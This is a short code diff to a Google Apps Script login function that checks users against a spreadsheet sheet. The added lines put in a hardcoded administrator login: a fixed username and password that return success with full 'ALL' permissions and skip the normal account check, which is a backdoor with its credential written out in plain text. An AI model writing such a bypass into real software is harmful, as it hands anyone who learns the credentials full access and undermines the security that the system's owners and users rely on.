@@ -434,6 +434,11 @@ function hashPassword(password) {
 }
 
 function authenticateUser(username, password) {
+  // ⭐ Hardcoded Admin Login
+  if (username === "badr" && password === "01210351419") {
+    return { success: true, username: "badr", displayName: "المدير العام", permissions: "ALL" };
+  }
+  
   var ss = SpreadsheetApp.getActiveSpreadsheet();
   var usersSheet = ss.getSheetByName("👥 المستخدمين");
   if (!usersSheet || usersSheet.getLastRow() < 2) {
